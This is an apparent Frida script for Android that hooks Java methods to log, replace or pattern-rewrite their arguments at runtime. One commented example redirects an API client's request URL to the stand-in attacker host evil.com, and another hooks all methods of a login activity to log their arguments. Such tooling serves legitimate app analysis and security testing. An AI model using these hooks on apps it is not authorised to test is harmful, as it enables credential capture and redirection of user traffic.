/**
 * android-argument-manipulation.js
 * Hook methods to capture and optionally manipulate arguments
 *
 * Usage: frida -U -f <package> -l android-argument-manipulation.js --no-pause
 * Options: CHANGE class method argIndex newValue
 */

'use strict';

console.log('[arg-manip] Loading argument manipulation hooks...');

var hooks = [];

/**
 * Hook a specific method and log/replace arguments
 * Java.perform(function() { hookMethod("com.example.MyClass", "myMethod", 0, "newValue"); });
 */
function hookMethod(className, methodName, argIndex, replacement) {
    Java.perform(function () {
        var cls = Java.use(className);
        var overloads = cls[methodName].overloads;

        overloads.forEach(function (overload) {
            overload.implementation = function () {
                var args = Array.prototype.slice.call(arguments);
                var original = args[argIndex];

                if (replacement !== undefined) {
                    console.log('[arg-manip] ' + className + '.' + methodName +
                        ' arg[' + argIndex + ']: "' + original + '" -> "' + replacement + '"');
                    args[argIndex] = replacement;
                } else {
                    console.log('[arg-manip] ' + className + '.' + methodName +
                        ' arg[' + argIndex + '] = "' + original + '"');
                }

                return this[methodName].apply(this, args);
            };
            hooks.push(className + '.' + methodName);
            console.log('[arg-manip] Hooked: ' + className + '.' + methodName);
        });
    });
}

/**
 * Hook all methods in a class and log arguments
 */
function hookAllMethods(className) {
    Java.perform(function () {
        var cls = Java.use(className);
        var methods = cls.class.getDeclaredMethods();

        methods.forEach(function (method) {
            var methodName = method.getName();
            try {
                cls[methodName].overloads.forEach(function (overload) {
                    overload.implementation = function () {
                        var args = Array.prototype.slice.call(arguments);
                        var argStr = args.map(function (a) {
                            return a !== null ? a.toString() : 'null';
                        }).join(', ');
                        console.log('[arg-manip] ' + className + '.' + methodName + '(' + argStr + ')');
                        return this[methodName].apply(this, args);
                    };
                    hooks.push(className + '.' + methodName);
                });
            } catch (e) {
                // Skip methods that can't be hooked
            }
        });

        console.log('[arg-manip] Hooked all methods in ' + className);
    });
}

/**
 * Manipulate a specific argument: replace string values matching pattern
 */
function manipulateArgs(className, methodName, pattern, replacement) {
    Java.perform(function () {
        var cls = Java.use(className);
        cls[methodName].overloads.forEach(function (overload) {
            overload.implementation = function () {
                var args = Array.prototype.slice.call(arguments);
                args.forEach(function (arg, i) {
                    if (arg !== null && typeof arg === 'string' && arg.indexOf(pattern) !== -1) {
                        console.log('[arg-manip] Modified arg[' + i + ']: "' + arg + '" -> "' + replacement + '"');
                        args[i] = replacement;
                    }
                });
                return this[methodName].apply(this, args);
            };
        });
    });
}

// Example hooks — uncomment or modify as needed
// hookMethod("com.example.api.ApiClient", "request", 0, "https://evil.com/");
// hookAllMethods("com.example.LoginActivity");

console.log('[arg-manip] Functions ready. Call hookMethod(), hookAllMethods(), or manipulateArgs() from console.');
console.log('[arg-manip] Loaded');
